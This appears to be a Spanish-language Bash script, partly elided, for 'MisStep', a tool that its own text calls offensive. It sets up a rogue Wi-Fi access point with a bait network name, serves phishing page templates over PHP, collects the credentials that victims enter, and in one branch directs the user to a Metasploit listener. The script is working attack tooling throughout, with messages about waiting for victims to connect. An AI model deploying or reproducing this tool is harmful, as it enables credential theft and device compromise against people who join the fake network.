...
# MisStep v2.1, Author @neoxzeo (Joel Baez)
...
function banner(){
  ...
  ╚═╝     ╚═╝╚═╝╚══════╝╚══════╝   ╚═╝   ╚══════╝╚═╝     "
    ...
    # Animación estilo arcade (retro)
  
    for i in $(seq 0 ${#text}); do
        char="${text:i:1}"

        # Muestra el carácter en color azul
        echo -n -e "${BLUE}${char}${RESET}"

        # Espera un poco antes de mostrar la siguiente letra
        sleep 0.05  # Puedes aumentar el valor para hacer la animación más lenta
    done
    echo "${endColour}${yellowColour}${endColour}${grayColour}Programado por ${endColour}${blueColour}@NeoXzeo - Joel Baez ${endColour}${purpleColour}"
sleep 0.02
   echo ""  # Nueva línea después de imprimir todo el texto
}
...
function guiMode(){
	whiptail --title "MisStep - by NeoXzeo" --msgbox "Bienvenido a MisStep, una herramienta ofensiva ideal para desplegar un Rogue AP a tu gusto." 8 78
	whiptail --title "MisStep - by NeoXzeo" --msgbox "Deja que compruebe que cuentas con todos los programas necesarios antes de empezar..." 8 78
	...
	tput civis; dependencias=(php dnsmasq hostapd)
		...
		whiptail --title "MisStep - by NeoXzeo" --msgbox "Perfecto, parece ser que cuentas con todo lo necesario..." 8 78
		tput civis
        else
		whiptail --title "MisStep - by NeoXzeo" --msgbox "Se ve que te faltan algunas dependencias, necesito que cuentes con las utilidades php, dnsmasq y hostapd instaladas" 8 78
                exit 1
        fi
	...
	whiptail --title "MisStep - by NeoXzeo" --msgbox "A continuación, te voy a listar tus interfaces de red disponibles, necesitaré que escojas aquella que acepte el modo monitor" 8 78
	...
	tput civis; interface=$(ifconfig -a | cut -d ' ' -f 1 | xargs | tr ' ' '\n' | tr -d ':' > iface)
        ...
        checker=0; while [ $checker -ne 1 ]; do
		choosed_interface=$(whiptail --inputbox "Interfaces de red disponibles:\n\n$(ifconfig | cut -d ' ' -f 1 | xargs | tr -d ':' | tr ' ' '\n' | while read line; do echo "[*] $line"; done)" 13 78 --title "MisStep - Interfaces de red" 3>&1 1>&2 2>&3)
                for interface in $(cat iface); do
                        if [ "$choosed_interface" == "$interface" ]; then
                                checker=1
                        fi
                done; if [ $checker -eq 0 ]; then whiptail --title "MisStep - Error en la selección de interfaz" --msgbox "La interfaz proporcionada no existe, vuelve a introducir la interfaz y asegúrate de que sea correcta" 8 78; fi
        done

	tput civis; whiptail --title "MisStep - by NeoXzeo" --msgbox "A continuación se va a configurar la interfaz $choosed_interface en modo monitor..." 8 78
	tput civis; airmon-ng start $choosed_interface > /dev/null 2>&1; choosed_interface="${choosed_interface}mon"

	rm iface 2>/dev/null
	use_ssid=$(whiptail --inputbox "Introduce el nombre del punto de acceso a utilizar (Ej: wifiGratis):" 8 78 --title "MisStep - by NeoXzeo" 3>&1 1>&2 2>&3)
	whiptail --title "MisStep - by NeoXzeo" --checklist \
	...
	whiptail --title "MisStep - by NeoXzeo" --msgbox "Perfecto, voy a crearte unos archivos de configuración para desplegar el ataque..." 8 78
	...
	whiptail --title "MisStep - by NeoXzeo" --msgbox "¡Listo!, hora de escoger tu plantilla" 8 78

        whiptail --title "MisStep - by NeoXzeo" --checklist --separate-output "Selecciona la plantilla que desees utilizar" 20 103 12 \
	...
	template=$(cat template | tr -d '"'); rm template
        ...
        if [ $check_plantillas -eq 1 ]; then
		whiptail --title "MisStep - by NeoXzeo" --msgbox "¡Listos para la batalla!, en breve el punto de acceso estará montado y será cuestión de esperar a que tus víctimas se conecten" 8 78
                tput civis; pushd $template > /dev/null 2>&1
                php -S 192.168.1.1:80 > /dev/null 2>&1 &
                sleep 2
                popd > /dev/null 2>&1; getCredentials
		...
		whiptail --title "MisStep - by NeoXzeo" --msgbox "¡Listos para la batalla!, en breve el punto de acceso estará montado y será cuestión de esperar a que tus víctimas se conecten" 8 78
                ...
                php -S 192.168.1.1:80 > /dev/null 2>&1 &
                sleep 2
		whiptail --title "MisStep - by NeoXzeo" --msgbox "Configura desde otra consola un Listener en Metasploit de la siguiente forma:\n\n$(cat msfconsole.rc)" 15 78
                popd > /dev/null 2>&1; getCredentials
	else
		whiptail --title "MisStep - by NeoXzeo" --msgbox "Veo que prefieres usar tu propia plantilla, sabia elección :)" 8 78
		template=$(whiptail --title "MisStep - by NeoXzeo" --inputbox "¡Pues vamos a ello!, dime el nombre de tu plantilla (debes crear un directorio con el mismo nombre):" 13 78 --title "MisStep - Plantilla personalizada" 3>&1 1>&2 2>&3)
                pushd $template > /dev/null 2>&1
                php -S 192.168.1.1:80 > /dev/null 2>&1 &
                sleep 2
                popd > /dev/null 2>&1; getCredentials
